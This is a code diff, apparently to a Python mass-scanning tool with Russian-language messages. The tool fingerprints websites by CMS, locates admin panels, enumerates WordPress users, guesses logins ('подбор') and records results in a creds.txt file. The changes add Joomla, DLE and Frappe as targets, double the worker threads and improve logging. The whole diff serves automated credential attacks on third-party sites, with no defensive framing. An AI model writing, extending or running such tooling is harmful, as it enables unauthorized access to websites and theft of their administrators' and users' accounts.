@@ -52,7 +52,7 @@ CREDS = os.path.join(RUN, "creds.txt")
 ERRS = os.path.join(RUN, "errors.log")
 LOCK = threading.Lock()
 SEM = threading.Semaphore(2)
-STAGE = ThreadPoolExecutor(max_workers=8)
+STAGE = ThreadPoolExecutor(max_workers=16)
 STAGE_LIMIT = 45
 
 _DIRTY = [False]
@@ -63,7 +63,7 @@ TAIL = []
 
 def _log(msg):
     with LOCK:
-        TAIL.append("%s %s" % (time.strftime("%H:%M:%S"), str(msg)[:90]))
+        TAIL.append("%s %s" % (time.strftime("%H:%M:%S"), str(msg)[:300]))
         del TAIL[:-6]
         try:
             with open(ERRS, "a", encoding="utf-8") as f:
@@ -245,7 +245,8 @@ def _work(host, st, use_browser, full):
 
     rec = {"score": score, "notes": notes + [kind], "creds": "", "done": False}
 
-    if kind not in ("opencart", "wordpress", "bitrix", "prestashop", "laravel", "django"):
+    if kind not in ("opencart", "wordpress", "bitrix", "prestashop", "laravel",
+                    "django", "joomla", "dle", "frappe"):
         rec["done"] = True
         rec["at"] = time.strftime("%Y-%m-%d %H:%M")
         st[host] = rec
@@ -341,12 +342,13 @@ def _work(host, st, use_browser, full):
                 _log("%s adminfind: %s" % (host, e))
                 hits = []
             if hits:
-                rec["notes"].append("админка: " + hits[0][0])
+                first = hits[0]
+                rec["notes"].append("админка: " + (first[0] if isinstance(first, (list, tuple)) else str(first)))
                 has_admin = True
         if has_admin:
             rec["notes"].append("админка")
             _stage(st, host, "подбор", rec)
-            login = hits[0][0] if hits else ""
+            login = (hits[0][0] if isinstance(hits[0], (list, tuple)) else str(hits[0])) if hits else ""
             res = ("none",)
             if kind == "wordpress":
                 us = _call(wp.users, 40, host)[1] or ["admin"]
@@ -481,6 +483,8 @@ def run(only=None, n_workers=None, n_limit=None, n_mode=None, n_browser=None):
         return
 
     os.makedirs(RUN, exist_ok=True)
+    if os.path.isfile(STOP):
+        ui.warn("найден старый STOP — сними его, иначе прогон встанет сразу")
     st = _load()
     if st:
         if ui.ask("сбросить прошлое состояние (1 да / 0 продолжить)", "1") == "1":
@@ -579,8 +583,8 @@ def run(only=None, n_workers=None, n_limit=None, n_mode=None, n_browser=None):
             for fut in fin:
                 try:
                     fut.result()
-                except Exception as e:
-                    _log("цель: " + traceback.format_exc(limit=1).replace("\n", " "))
+                except Exception:
+                    _log("цель: " + traceback.format_exc().replace("\n", " | ")[:400])
                 done += 1
                 box[0] = done
             if os.path.isfile(STOP):
